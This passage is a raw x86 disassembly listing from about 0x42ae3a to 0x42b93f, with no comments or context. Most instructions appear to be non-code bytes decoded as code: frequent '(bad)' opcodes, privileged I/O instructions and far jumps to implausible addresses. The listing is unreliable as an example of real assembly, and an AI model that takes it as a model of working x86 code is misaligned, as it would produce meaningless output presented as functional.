  42ae3a:	and    BYTE PTR [ebp-0x7973adf1],ah
  42ae40:	js     0x42ae42
	...
  42aeb2:	add    BYTE PTR [eax],al
  42aeb4:	xor    DWORD PTR [ebp-0x38],eax
  42aeb7:	push   es
  42aeb8:	cld    
  42aeb9:	(bad)  
  42aeba:	push   DWORD PTR [edi+0x59]
  42aebd:	out    dx,eax
  42aebe:	adc    dl,al
  42aec0:	leave  
  42aec1:	jp     0x42af3b
  42aec3:	xchg   edi,eax
  42aec4:	jae    0x42ae8c
  42aec6:	add    DWORD PTR [eax],eax
  42aec8:	cmc    
  42aec9:	add    BYTE PTR [eax],al
  42aecb:	add    BYTE PTR [esi-0x7735de17],bh
  42aed1:	mov    cl,0xd8
  42aed3:	mov    ch,0x1f
  42aed5:	xchg   ecx,eax
  42aed6:	dec    ecx
  42aed7:	and    al,0xa7
  42aed9:	cld    
  42aeda:	inc    ebx
  42aedb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42aedc:	or     esp,DWORD PTR [esi*1-0x70849cb9]
  42aee3:	add    edi,ebx
  42aee5:	lds    esi,FWORD PTR [ebx-0x24]
  42aee8:	adc    al,0x3a
  42aeea:	into   
  42aeeb:	and    al,0x21
  42aeed:	add    al,0xd
  42aeef:	fsubp  st(6),st
  42aef1:	push   esp
  42aef2:	xchg   edx,eax
  42aef3:	aas    
  42aef4:	add    eax,0xdcebed59
  42aef9:	inc    eax
  42aefa:	cmp    edx,eax
  42aefc:	(bad)  
  42aefd:	adc    dl,BYTE PTR ds:0xa9141ec0
  42af03:	mov    ds:0x9680e9b0,eax
  42af08:	lea    esi,[ecx-0x1685bfe2]
  42af0e:	mov    al,ds:0x6033699a
  42af13:	or     ch,al
  42af15:	repz gs push esi
  42af18:	imul   ebp,DWORD PTR [edx],0x5b9459f7
  42af1e:	mov    ds:0xb4abdbe6,eax
  42af23:	jmp    0xd546a436
  42af28:	iret   
  42af29:	ja     0x42af13
  42af2b:	mov    bl,0x97
  42af2d:	out    0xa4,eax
  42af2f:	dec    eax
  42af30:	test   eax,0x64cd230d
  42af35:	push   esp
  42af36:	lahf   
  42af37:	cmp    al,0x1b
  42af39:	mov    cs,WORD PTR [edx+edi*4-0x25c97095]
  42af40:	ja     0x42af17
  42af42:	sub    BYTE PTR [edx+0x3b],0x27
  42af46:	or     ebp,DWORD PTR [edi]
  42af48:	outs   dx,BYTE PTR ds:[esi]
  42af49:	xchg   ebx,eax
  42af4a:	cmp    BYTE PTR [esi+esi*8-0x1ff8b72e],bh
  42af51:	scas   eax,DWORD PTR es:[edi]
  42af52:	icebp  
  42af53:	sti    
  42af54:	push   ecx
  42af55:	xchg   ebx,eax
  42af56:	sbb    BYTE PTR [ebp-0x746fe8dc],ch
  42af5c:	sbb    DWORD PTR [esi],esi
  42af5e:	outs   dx,BYTE PTR ds:[esi]
  42af5f:	out    0xc4,eax
  42af61:	cmp    al,bl
  42af63:	adc    eax,DWORD PTR [ebp+0x8]
  42af66:	pop    esi
  42af67:	jo     0x42af7b
  42af69:	mov    ebx,0xa9a4363e
  42af6e:	retf   0xca4e
  42af71:	mov    esi,0x8a19125
  42af76:	or     al,0xde
  42af78:	ins    BYTE PTR es:[edi],dx
  42af79:	and    BYTE PTR [edi],cl
  42af7b:	mov    ch,0x84
  42af7d:	stc    
  42af7e:	clc    
  42af7f:	sti    
  42af80:	pop    esi
  42af81:	aaa    
  42af82:	sub    esi,0x3acea452
  42af88:	(bad)  
  42af89:	push   eax
  42af8a:	gs push edx
  42af8c:	enter  0x49eb,0x54
  42af90:	push   ss
  42af91:	or     BYTE PTR [edx],0x71
  42af94:	sti    
  42af95:	arpl   WORD PTR [esi+edx*8+0xc],bp
  42af99:	push   ss
  42af9a:	jge    0x42afc2
  42af9c:	cld    
  42af9d:	push   ds
  42af9e:	retf   0xdedc
  42afa1:	push   0xb7305a22
  42afa6:	test   al,0xb5
  42afa8:	mov    esi,0x804c4dbb
  42afad:	push   0x4c06e2c5
  42afb2:	jmp    0xf95d:0xaccf5220
  42afb9:	in     al,dx
  42afba:	inc    ebx
  42afbb:	adc    eax,edx
  42afbd:	sub    al,0xce
  42afbf:	inc    esi
  42afc0:	jmp    0x42afc2
	...
  42b032:	add    BYTE PTR [eax],al
  42b034:	xlat   BYTE PTR ds:[ebx]
  42b035:	pushf  
  42b036:	shr    BYTE PTR [ebp-0x1000235],0x4c
  42b03d:	jb     0x42b001
  42b03f:	ret    0x529
  42b042:	or     al,0xd7
  42b044:	push   0xf50001c7
  42b049:	add    BYTE PTR [eax],al
  42b04b:	add    BYTE PTR [ebp-0x24],cl
  42b04e:	(bad)  
  42b04f:	ror    DWORD PTR [esi],cl
  42b051:	jno    0x42afff
  42b053:	ss pusha 
  42b055:	xchg   DWORD PTR [di+0x3a],esi
  42b059:	mov    ebp,0x8ef4e43f
  42b05e:	adc    eax,DWORD PTR [ecx]
  42b060:	jp     0x42b0d4
  42b062:	aas    
  42b063:	clc    
  42b064:	iret   
  42b065:	dec    eax
  42b066:	mov    dh,0xf5
  42b068:	retf   0x3a92
  42b06b:	int3   
  42b06c:	clc    
  42b06d:	mov    edx,0x8f6fb7a0
  42b072:	add    DWORD PTR [ecx+0x50],edi
  42b075:	cwde   
  42b076:	scas   al,BYTE PTR es:[edi]
  42b077:	and    al,0x7a
  42b079:	sbb    al,BYTE PTR [ebx]
  42b07b:	call   0x76ad:0x1c428b49
  42b082:	fmul   DWORD PTR [esi*2-0x3f862431]
  42b089:	mov    eax,ds:0x34347e41
  42b08e:	test   BYTE PTR [esi-0x79],bh
  42b091:	test   DWORD PTR [eax+0x1d],ebp
  42b094:	mov    edx,DWORD PTR [esi]
  42b096:	outs   dx,BYTE PTR ds:[esi]
  42b097:	neg    DWORD PTR [ebp-0x4634b2a5]
  42b09d:	sbb    DWORD PTR [esi-0x397934c1],0x5e9b3dbb
  42b0a7:	pop    edx
  42b0a8:	sub    dl,BYTE PTR [ebx]
  42b0aa:	aaa    
  42b0ab:	dec    esp
  42b0ac:	ds mov bl,0x39
  42b0af:	inc    ebx
  42b0b0:	pop    esi
  42b0b1:	dec    ecx
  42b0b2:	cwde   
  42b0b3:	into   
  42b0b4:	inc    ebp
  42b0b5:	jae    0x42b0b5
  42b0b7:	shl    BYTE PTR [edx+edx*1+0x30],0x5d
  42b0bc:	fdiv   QWORD PTR [eax+0x32f7f5ea]
  42b0c2:	mov    eax,0xae16eb22
  42b0c7:	mov    eax,0x43fc16db
  42b0cc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b0cd:	mov    dl,BYTE PTR ds:0x804a1dde
  42b0d3:	or     BYTE PTR [eax+0x7d],0x11
  42b0d7:	(bad)  
  42b0d8:	cmp    al,0x9f
  42b0da:	clc    
  42b0db:	mov    esi,0xf6707b49
  42b0e0:	int    0xed
  42b0e2:	stos   BYTE PTR es:[edi],al
  42b0e3:	jbe    0x42b098
  42b0e5:	or     BYTE PTR [ebx+0x48],0xb8
  42b0e9:	jne    0x42b0a6
  42b0eb:	and    ebx,DWORD PTR [ebx-0x24234b46]
  42b0f1:	out    0xe4,al
  42b0f3:	pop    esp
  42b0f4:	pushf  
  42b0f5:	xchg   esp,eax
  42b0f6:	enter  0x6073,0x40
  42b0fa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b0fb:	ficomp WORD PTR [edx+0x4c4f81b6]
  42b101:	rcr    DWORD PTR ds:0x3ad21087,cl
  42b107:	jns    0x42b104
  42b109:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b10a:	cmp    ah,cl
  42b10c:	xor    edx,ecx
  42b10e:	adc    bh,BYTE PTR [esi+0x4662840b]
  42b114:	das    
  42b115:	inc    esi
  42b116:	pop    ebp
  42b117:	add    dh,BYTE PTR [ebx-0x9f0a061]
  42b11d:	add    eax,0x87ad184a
  42b122:	or     esp,DWORD PTR [eax+0x71]
  42b125:	cld    
  42b126:	dec    ebx
  42b127:	std    
  42b128:	stc    
  42b129:	cmp    eax,ebp
  42b12b:	in     eax,0x71
  42b12d:	clc    
  42b12e:	fsubr  DWORD PTR [ecx+0x2a0d63b0]
  42b134:	ror    BYTE PTR [esp+edx*8+0x32151c0f],0xcf
  42b13c:	nop
  42b13d:	cdq    
  42b13e:	popf   
  42b13f:	cmp    esi,0x0
	...
  42b1b2:	add    BYTE PTR [eax],al
  42b1b4:	sub    eax,DWORD PTR [ebp+0x19bf1995]
  42b1ba:	scas   eax,DWORD PTR es:[edi]
  42b1bb:	mov    bh,0x27
  42b1bd:	xchg   ecx,eax
  42b1be:	push   esp
  42b1bf:	outs   dx,DWORD PTR ds:[esi]
  42b1c0:	push   0x5d6d67a7
  42b1c5:	enter  0x1,0xf5
  42b1c9:	add    BYTE PTR [eax],al
  42b1cb:	add    BYTE PTR [ebx-0x54750d89],ah
  42b1d1:	fcom   DWORD PTR [ebp+0xf]
  42b1d4:	push   0x66a80b0b
  42b1d9:	shl    DWORD PTR [esi-0x76488f91],0xda
  42b1e0:	xchg   DWORD PTR [edx+0x33],ebp
  42b1e3:	out    dx,eax
  42b1e4:	jbe    0x42b216
  42b1e6:	xchg   ecx,ebx
  42b1e8:	test   eax,0x9fa87eb4
  42b1ed:	loopne 0x42b1d9
  42b1ef:	cwde   
  42b1f0:	pop    ebx
  42b1f1:	je     0x42b18c
  42b1f3:	push   ds
  42b1f4:	retw   
  42b1f6:	dec    edi
  42b1f7:	in     eax,0x8f
  42b1f9:	add    DWORD PTR [edi-0x1c77dcd5],0xffffff97
  42b200:	adc    edx,eax
  42b202:	pushf  
  42b203:	and    eax,0xb36ad4d6
  42b208:	push   ss
  42b209:	mov    edx,0xce797058
  42b20e:	out    0xed,eax
  42b210:	je     0x42b201
  42b212:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b213:	lock hlt 
  42b215:	popa   
  42b216:	pusha  
  42b217:	add    dh,0x72
  42b21a:	mov    BYTE PTR ds:0x2046dbb3,dh
  42b220:	dec    esi
  42b221:	mov    esi,0xecd6baef
  42b226:	aas    
  42b227:	mov    ds:0xfc932e80,eax
  42b22c:	cmp    cl,bl
  42b22e:	cmp    al,0x23
  42b230:	daa    
  42b231:	popf   
  42b232:	in     al,0x74
  42b234:	push   ebx
  42b235:	xchg   al,al
  42b237:	xchg   ecx,eax
  42b238:	push   esp
  42b239:	xor    edx,0xe184d897
  42b23f:	scas   al,BYTE PTR es:[edi]
  42b240:	popf   
  42b241:	sti    
  42b242:	lods   eax,DWORD PTR ds:[esi]
  42b243:	pop    eax
  42b244:	repnz test DWORD PTR [eax-0x1e],ecx
  42b248:	cli    
  42b249:	sub    BYTE PTR [eax+eiz*1-0x7ce326dc],dl
  42b250:	mov    ch,0x67
  42b252:	stc    
  42b253:	ja     0x42b212
  42b255:	xchg   ch,dl
  42b257:	xor    DWORD PTR [ecx],ebx
  42b259:	inc    ebp
  42b25a:	test   DWORD PTR [ecx],eax
  42b25c:	and    esi,DWORD PTR [ecx-0x2e65f708]
  42b262:	test   BYTE PTR [eax+eax*1],dh
  42b265:	push   es
  42b266:	pop    ebx
  42b267:	nop
  42b268:	pop    es
  42b269:	push   esi
  42b26a:	pop    esi
  42b26c:	fcmovne st,st(0)
  42b26e:	or     al,0x1d
  42b270:	dec    esp
  42b271:	jnp    0x42b2e7
  42b273:	(bad)  
  42b274:	ins    DWORD PTR es:[edi],dx
  42b275:	sub    BYTE PTR [ecx+0x1b15f9],dl
  42b27b:	rcl    BYTE PTR [eax],cl
  42b27d:	and    al,BYTE PTR [di-0x1]
  42b281:	es push edx
  42b283:	loopne 0x42b256
  42b285:	jo     0x42b222
  42b287:	dec    edx
  42b288:	scas   eax,DWORD PTR es:[edi]
  42b289:	push   0x19
  42b28b:	or     DWORD PTR [edi-0x5a6e7609],edx
  42b291:	adc    dh,BYTE PTR [ecx-0x26]
  42b294:	ficom  DWORD PTR [eax]
  42b296:	mov    esi,0x1be63528
  42b29b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b29c:	push   esp
  42b29d:	test   ch,0x33
  42b2a0:	clc    
  42b2a1:	aad    0xcc
  42b2a3:	add    DWORD PTR [ebx],0x34
  42b2a6:	cmp    DWORD PTR [edi+ecx*1+0x8],eax
  42b2aa:	hlt    
  42b2ab:	loope  0x42b2a5
  42b2ad:	xor    esi,DWORD PTR [esi+ebx*2]
  42b2b0:	into   
  42b2b1:	pop    edx
  42b2b2:	test   al,0xc2
  42b2b4:	ja     0x42b2d6
  42b2b6:	mul    DWORD PTR [eax+0x6a]
  42b2b9:	cmp    BYTE PTR ss:[eiz*1-0x1616d333],cl
	...
  42b331:	add    BYTE PTR [eax],al
  42b333:	add    BYTE PTR [edi+0xe],bh
  42b336:	jne    0x42b373
  42b338:	jne    0x42b3b5
  42b33a:	jg     0x42b38a
  42b33c:	out    0x79,eax
  42b33e:	and    DWORD PTR [eax+0x62],esi
  42b341:	pop    es
  42b342:	xor    esi,DWORD PTR [eax+0x1c952]
  42b348:	cmc    
  42b349:	add    BYTE PTR [eax],al
  42b34b:	add    BYTE PTR [ebx],dl
  42b34d:	pop    edx
  42b34e:	xor    eax,DWORD PTR [edx+0x1227b10e]
  42b354:	lods   eax,DWORD PTR ds:[esi]
  42b355:	pop    esp
  42b356:	sub    BYTE PTR [edi-0x670d261e],0x74
  42b35d:	add    cl,dl
  42b35f:	cmc    
  42b360:	xchg   BYTE PTR ss:[edi],dl
  42b363:	mov    eax,ds:0xe74fea8e
  42b368:	leave  
  42b369:	xlat   BYTE PTR ds:[ebx]
  42b36a:	rol    DWORD PTR cs:[esi+0x71],0xa1
  42b36f:	or     esp,eax
  42b371:	inc    ebx
  42b372:	(bad)  
  42b373:	fdivr  QWORD PTR [edi-0x43358044]
  42b379:	jmp    0x7bc13b0a
  42b37e:	fwait
  42b37f:	or     edx,edi
  42b381:	iret   
  42b382:	outs   dx,DWORD PTR ds:[esi]
  42b383:	adc    BYTE PTR [eax],dl
  42b385:	mov    esi,0x805dcefe
  42b38a:	lods   al,BYTE PTR ds:[esi]
  42b38b:	and    ah,ch
  42b38d:	push   esi
  42b38e:	imul   ecx,ebp,0x57
  42b391:	pop    ecx
  42b392:	in     al,dx
  42b393:	xor    al,0x78
  42b395:	ror    BYTE PTR [ecx-0x1e61ad1a],1
  42b39b:	out    0xfc,eax
  42b39d:	sbb    BYTE PTR [ecx+0x6],ch
  42b3a0:	pusha  
  42b3a1:	mov    bl,0x28
  42b3a3:	cmp    DWORD PTR ss:[edi-0x5f],edi
  42b3a7:	mov    ah,0xb8
  42b3a9:	cli    
  42b3aa:	enterw 0x1f67,0x6b
  42b3af:	mov    ds:0x4d61e23f,al
  42b3b4:	ucomiss xmm5,xmm3
  42b3b7:	sbb    eax,0xa3e22d06
  42b3bc:	pop    esp
  42b3bd:	xor    ch,BYTE PTR [eax+eiz*8-0x3c7703ae]
  42b3c4:	dec    eax
  42b3c5:	lahf   
  42b3c6:	leave  
  42b3c7:	and    cl,al
  42b3c9:	pop    es
  42b3ca:	and    esi,DWORD PTR [eax]
  42b3cc:	inc    ebp
  42b3cd:	xchg   ebp,eax
  42b3ce:	sub    al,0x26
  42b3d0:	inc    ecx
  42b3d1:	jbe    0x42b387
  42b3d3:	out    0x4e,eax
  42b3d5:	mov    ah,BYTE PTR [ecx]
  42b3d7:	dec    edx
  42b3d8:	sub    eax,DWORD PTR [ecx+esi*8+0x12]
  42b3dc:	jg     0x42b435
  42b3de:	inc    edi
  42b3df:	xor    ch,BYTE PTR [eax-0x2634ecac]
  42b3e5:	jmp    0xf9b2b66d
  42b3ea:	mov    eax,ds:0x37eac32e
  42b3ef:	mov    edx,0xe438a330
  42b3f4:	sbb    BYTE PTR [esi+edx*8+0x50],0xb9
  42b3f9:	pop    esi
  42b3fa:	(bad)  
  42b3fb:	pop    ss
  42b3fc:	icebp  
  42b3fd:	sbb    ebp,esp
  42b3ff:	mov    DWORD PTR [ebx-0x66],edi
  42b402:	xchg   ebx,eax
  42b403:	jb     0x42b3fa
  42b405:	xor    esp,DWORD PTR [eax+eiz*4-0x4c2d3ae6]
  42b40c:	adc    al,dh
  42b40e:	push   cs
  42b40f:	fsubr  DWORD PTR [eax]
  42b411:	ja     0x42b43f
  42b413:	xor    BYTE PTR [eax+0x25],dl
  42b416:	and    DWORD PTR [edi+eiz*1],edx
  42b419:	mov    eax,ds:0x8e664801
  42b41e:	mov    ebp,0xec8f9251
  42b423:	push   edx
  42b425:	or     esi,DWORD PTR [esi]
  42b427:	inc    DWORD PTR [ebx]
  42b429:	mov    bl,0xe5
  42b42b:	daa    
  42b42c:	out    0xbd,al
  42b42e:	cmp    cl,BYTE PTR [edi+0x3e]
  42b431:	xchg   esp,eax
  42b432:	outs   dx,BYTE PTR ds:[esi]
  42b433:	push   ebp
  42b434:	push   0xf7ef44a3
  42b439:	not    DWORD PTR [edx]
  42b43b:	stos   DWORD PTR es:[edi],eax
  42b43c:	jno    0x42b3f7
  42b43e:	jne    0x42b3f5
	...
  42b4b4:	sbb    BYTE PTR [edi+0x17],cl
  42b4b7:	mov    ecx,0xefbef957
  42b4bc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b4bd:	fstp   QWORD PTR [esi+0x5]
  42b4c0:	add    al,0xe4
  42b4c2:	adc    BYTE PTR [eax+0x47],bh
  42b4c5:	retf   0x1
  42b4c8:	cmc    
  42b4c9:	add    BYTE PTR [eax],al
  42b4cb:	add    al,ah
  42b4cd:	and    eax,0x82edbeef
  42b4d2:	or     ecx,DWORD PTR [ebp+0x13da717f]
  42b4d8:	cmovle esp,DWORD PTR [ecx+eiz*1]
  42b4dc:	popa   
  42b4dd:	adc    ebp,0x70d9d6f4
  42b4e3:	pop    edx
  42b4e4:	xchg   DWORD PTR [edx],ebx
  42b4e6:	xor    BYTE PTR [eax+0x1b],0x76
  42b4ea:	retw   0x9db8
  42b4ee:	mov    al,ds:0xca51f92d
  42b4f3:	sar    DWORD PTR [edi+ebx*4],cl
  42b4f6:	bound  ecx,QWORD PTR [eax+edx*1]
  42b4f9:	mov    esi,0xdaed498f
  42b4fe:	pop    eax
  42b4ff:	ja     0x42b563
  42b501:	inc    ecx
  42b502:	dec    esi
  42b503:	sub    eax,0xfd654fd3
  42b508:	mov    DWORD PTR fs:[esi+0x223e32f7],0x9cd8055
  42b513:	ds xchg ebp,eax
  42b515:	ja     0x42b4aa
  42b517:	outs   dx,BYTE PTR ds:[esi]
  42b518:	cs sbb eax,0x6d77326b
  42b51e:	aam    0xea
  42b520:	mov    cl,0xf1
  42b522:	mov    cl,0x77
  42b524:	not    BYTE PTR [ebp-0x260afe55]
  42b52a:	and    al,0x6
  42b52c:	sbb    al,0x68
  42b52e:	pop    esp
  42b52f:	push   edx
  42b530:	imul   ebp,edi,0x4865d7c5
  42b536:	xchg   esp,eax
  42b537:	mov    dl,0xf7
  42b539:	icebp  
  42b53a:	(bad)  [ebp-0x5d]
  42b53d:	pusha  
  42b53e:	arpl   WORD PTR [edx],dx
  42b540:	nop
  42b541:	xor    dl,BYTE PTR [esi+edi*8-0x56f3e8f6]
  42b548:	xchg   ebx,eax
  42b549:	xor    eax,0x9866c79f
  42b54e:	jmp    0x11d562d2
  42b553:	mov    ds:0xb53142e1,eax
  42b558:	inc    edx
  42b559:	sahf   
  42b55a:	adc    eax,0xb3ffa157
  42b55f:	dec    ecx
  42b560:	dec    esi
  42b561:	push   0xa7a1a5bd
  42b566:	call   0x58b9:0xa55c208
  42b56d:	ds or  bh,ch
  42b570:	sbb    ch,ch
  42b572:	mov    dh,0x6c
  42b574:	in     eax,dx
  42b575:	add    esp,ebx
  42b577:	outs   dx,DWORD PTR ds:[esi]
  42b578:	shl    BYTE PTR [ecx+0x2e],1
  42b57b:	scas   al,BYTE PTR es:[edi]
  42b57c:	jmp    0xefac:0xc529b91d
  42b583:	jg     0x42b5e7
  42b585:	cwde   
  42b586:	add    eax,0x3134f333
  42b58b:	cmp    BYTE PTR [ecx+ebx*1+0x481471e6],ch
  42b592:	fmul   DWORD PTR [edi+0x56]
  42b595:	cmp    eax,0x37dd7c3e
  42b59a:	outs   dx,DWORD PTR ds:[esi]
  42b59b:	sub    ecx,DWORD PTR [ebx+0x594841c9]
  42b5a1:	aas    
  42b5a2:	add    esp,ecx
  42b5a4:	add    cl,BYTE PTR [ebx+0x11ed7397]
  42b5aa:	mov    dl,0xfd
  42b5ac:	jmp    0x42b5ea
  42b5ae:	(bad)  
  42b5af:	mov    dl,0x62
  42b5b1:	int    0x7b
  42b5b3:	pop    esp
  42b5b4:	out    dx,eax
  42b5b5:	pusha  
  42b5b6:	cmc    
  42b5b7:	pop    edi
  42b5b8:	ds aaa 
  42b5ba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b5bb:	or     ebp,ecx
  42b5bd:	pop    ebx
  42b5be:	push   cs
  42b5bf:	jmp    0x0:0x57
	...
  42b632:	add    BYTE PTR [eax],al
  42b634:	and    al,0x16
  42b636:	outs   dx,BYTE PTR ds:[esi]
  42b637:	(bad)  
  42b638:	jle    0x42b639
  42b63a:	lods   eax,DWORD PTR ds:[esi]
  42b63b:	not    esi
  42b63d:	mov    dl,dh
  42b63f:	add    dh,BYTE PTR [ebx+0x3c3fb4db]
  42b645:	retf   
  42b646:	add    DWORD PTR [eax],eax
  42b648:	cmc    
  42b649:	add    BYTE PTR [eax],al
  42b64b:	add    BYTE PTR [edi+0x68747d1],ch
  42b651:	adc    ebx,ebp
  42b653:	in     al,dx
  42b654:	cwde   
  42b655:	xchg   DWORD PTR [edx-0x4c],eax
  42b658:	into   
  42b659:	lods   al,BYTE PTR ds:[esi]
  42b65a:	out    0xa,al
  42b65c:	pop    ds
  42b65d:	stc    
  42b65e:	and    BYTE PTR [eax],dh
  42b660:	cli    
  42b661:	imul   eax,esp,0x3a
  42b664:	xchg   esp,eax
  42b665:	(bad)  
  42b668:	xchg   esp,eax
  42b669:	cmp    ecx,DWORD PTR [esi+0x16b289fa]
  42b66f:	inc    ebp
  42b670:	push   0xfffffff1
  42b672:	cmc    
  42b673:	retf   
  42b674:	pop    ebx
  42b675:	fcom   DWORD PTR ds:0x88f70dad
  42b67b:	ja     0x42b6a1
  42b67d:	sahf   
  42b67e:	pusha  
  42b67f:	mov    cl,0x9a
  42b681:	cdq    
  42b682:	test   al,0xeb
  42b684:	and    ebp,esp
  42b686:	mov    BYTE PTR [ecx-0x40],dl
  42b689:	(bad)  
  42b68a:	jnp    0x42b6cf
  42b68c:	in     eax,dx
  42b68d:	sub    al,0x52
  42b68f:	mov    dh,0x32
  42b691:	jns    0x42b64d
  42b693:	and    esi,DWORD PTR [ebp+edx*4-0x73]
  42b697:	ds xchg edx,eax
  42b699:	repnz ror DWORD PTR [edx],1
  42b69c:	push   ds
  42b69d:	sti    
  42b69e:	push   edx
  42b69f:	jge    0x42b66c
  42b6a1:	nop
  42b6a2:	sub    dl,BYTE PTR [eax+0xd983d65]
  42b6a8:	pop    ebp
  42b6a9:	cmp    esi,edi
  42b6ab:	rol    BYTE PTR [esi-0x52907080],cl
  42b6b1:	push   ds
  42b6b2:	(bad)  
  42b6b3:	and    ch,BYTE PTR [edi]
  42b6b5:	outs   dx,BYTE PTR ds:[esi]
  42b6b6:	xor    eax,0x5a8741d9
  42b6bb:	pop    edx
  42b6bc:	add    eax,0x34efebff
  42b6c1:	jno    0x42b6d0
  42b6c3:	mov    ah,0xa0
  42b6c5:	sub    ebp,DWORD PTR [ebp-0x5ca30d3a]
  42b6cb:	dec    ebp
  42b6cc:	jne    0x42b69f
  42b6ce:	idiv   DWORD PTR [eax-0x4b73523e]
  42b6d4:	gs lahf 
  42b6d6:	mov    ebp,DWORD PTR [ecx+0x7431eefe]
  42b6dc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b6dd:	cld    
  42b6de:	mov    al,0x12
  42b6e0:	jae    0x42b726
  42b6e2:	call   0x5555:0xef4bfe48
  42b6e9:	xor    BYTE PTR [edx],bl
  42b6eb:	jb     0x42b67f
  42b6ed:	inc    ecx
  42b6ee:	inc    ecx
  42b6ef:	xchg   esi,eax
  42b6f0:	in     al,0x69
  42b6f2:	inc    eax
  42b6f3:	(bad)  
  42b6f6:	mov    ecx,0xad30de16
  42b6fb:	mov    bl,0x47
  42b6fd:	test   bl,ah
  42b6ff:	leave  
  42b700:	jmp    0x42b746
  42b702:	jbe    0x42b77a
  42b704:	xchg   ecx,eax
  42b705:	mov    ch,0x7c
  42b707:	add    BYTE PTR [ecx+0x5aca7f5],0xd7
  42b70e:	jmp    0x81604c7f
  42b713:	jno    0x42b77c
  42b715:	jns    0x42b6b7
  42b717:	sar    DWORD PTR [ebp+0x15],cl
  42b71a:	push   cs
  42b71b:	lahf   
  42b71c:	mov    ds,WORD PTR [eax-0x7c]
  42b71f:	arpl   WORD PTR [esi-0x3adeded4],dx
  42b725:	xchg   esi,eax
  42b726:	adc    bh,BYTE PTR [eax+0x17fdb83e]
  42b72c:	out    0x56,al
  42b72e:	or     esi,DWORD PTR ds:0xbb495c54
  42b734:	xchg   esi,ebp
  42b736:	jmp    0x986e:0xff4a4bc9
  42b73d:	mov    dl,0xfe
  42b73f:	cmp    eax,0x9b
	...
  42b7b4:	mov    ah,BYTE PTR [ebp+0x63]
  42b7b7:	mov    edi,0x75debfef
  42b7bc:	push   0xffffff98
  42b7be:	xor    eax,0x42df1cfb
  42b7c3:	aas    
  42b7c4:	xor    esp,ecx
  42b7c6:	add    DWORD PTR [eax],eax
  42b7c8:	cmc    
  42b7c9:	add    BYTE PTR [eax],al
  42b7cb:	add    BYTE PTR [edx],bh
  42b7cd:	ins    BYTE PTR es:[edi],dx
  42b7ce:	ret    0x6e6
  42b7d1:	je     0x42b7ac
  42b7d3:	jmp    0x42b78d
  42b7d5:	inc    esi
  42b7d6:	(bad)  
  42b7d7:	push   edi
  42b7d8:	or     dl,BYTE PTR [edi]
  42b7da:	lods   eax,DWORD PTR ds:[esi]
  42b7db:	cdq    
  42b7dc:	add    eax,0xf533d3ce
  42b7e1:	(bad)  
  42b7e2:	push   0xb965e36b
  42b7e7:	mov    eax,0x1b261621
  42b7ec:	je     0x42b845
  42b7ee:	push   edi
  42b7ef:	cmp    BYTE PTR [ebp+ecx*2-0x6d940240],bl
  42b7f6:	sti    
  42b7f7:	fstp   QWORD PTR [ebp+0x5d451d88]
  42b7fd:	or     al,BYTE PTR [ecx+0x469cb455]
  42b803:	or     al,0xa2
  42b805:	sbb    eax,0xb3833b85
  42b80a:	in     al,0x2c
  42b80c:	push   es
  42b80d:	adc    eax,0xd190295d
  42b812:	pop    ebx
  42b813:	or     DWORD PTR [esi-0x5f],edx
  42b816:	gs ins BYTE PTR es:[edi],dx
  42b818:	sub    ax,0xeb17
  42b81c:	push   esp
  42b81d:	lods   eax,DWORD PTR ds:[esi]
  42b81e:	fld    DWORD PTR [ebx]
  42b820:	(bad)  
  42b821:	sti    
  42b822:	mov    eax,ds:0x475e3ee3
  42b827:	mov    bh,0x7e
  42b829:	rcr    BYTE PTR [edx-0x13328254],cl
  42b82f:	pop    esi
  42b830:	ins    DWORD PTR es:[edi],dx
  42b831:	out    dx,eax
  42b832:	out    dx,al
  42b833:	sbb    bl,BYTE PTR [edi]
  42b835:	loopne 0x42b7ea
  42b837:	cmpps  xmm3,XMMWORD PTR [ecx],0x4a
  42b83b:	inc    esp
  42b83c:	jl     0x42b7dd
  42b83e:	or     al,0x64
  42b840:	mov    ds:0x67aa0f7,al
  42b845:	sbb    eax,0x60b315e9
  42b84a:	lahf   
  42b84b:	imul   ebx,DWORD PTR ds:0xc4f03a0,0x72264ca4
  42b855:	or     bh,BYTE PTR [ecx+esi*4]
  42b858:	dec    ebp
  42b859:	jp     0x42b8be
  42b85b:	out    0x3a,al
  42b85d:	and    al,0x1a
  42b85f:	pushf  
  42b860:	mov    al,0xfd
  42b862:	jl     0x42b82f
  42b864:	add    bl,BYTE PTR ds:0x69a89f93
  42b86a:	and    ebp,DWORD PTR [edx-0x1f25ef65]
  42b870:	ficom  WORD PTR es:[edi-0x122d8c04]
  42b877:	sbb    DWORD PTR [edx-0x682bccd1],ecx
  42b87d:	push   cs
  42b87e:	nop
  42b87f:	pop    edx
  42b880:	pushf  
  42b881:	pushf  
  42b882:	add    dl,BYTE PTR [edi-0x67]
  42b885:	int    0x95
  42b887:	mov    ah,0x18
  42b889:	test   al,0xc1
  42b88b:	push   esp
  42b88c:	mov    dh,0xef
  42b88e:	push   ds
  42b88f:	out    dx,eax
  42b890:	div    BYTE PTR [ebp+0x1989ec60]
  42b896:	push   ecx
  42b897:	mov    ds:0x4133cf81,al
  42b89c:	cmp    BYTE PTR [ebp-0x6],al
  42b89f:	imul   edx,eax,0xffffffd2
  42b8a2:	add    al,0xa
  42b8a4:	(bad)  
  42b8a5:	lahf   
  42b8a6:	pop    ecx
  42b8a7:	loope  0x42b901
  42b8a9:	mov    ebp,cs
  42b8ab:	pop    esi
  42b8ac:	push   ecx
  42b8ad:	les    esi,FWORD PTR [esi+0x2179c96]
  42b8b3:	daa    
  42b8b4:	or     DWORD PTR [ebx],ecx
  42b8b6:	outs   dx,DWORD PTR ds:[esi]
  42b8b7:	push   0xffffff9b
  42b8b9:	jbe    0x42b8e7
  42b8bb:	sti    
  42b8bc:	mov    ecx,DWORD PTR [edx+0x5b750c]
	...
  42b932:	add    BYTE PTR [eax],al
  42b934:	test   al,0x93
  42b936:	sbb    eax,0xfbee3fee
  42b93b:	xlat   BYTE PTR ds:[ebx]
  42b93c:	ss push esi
  42b93e:	inc    esp
  42b93f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
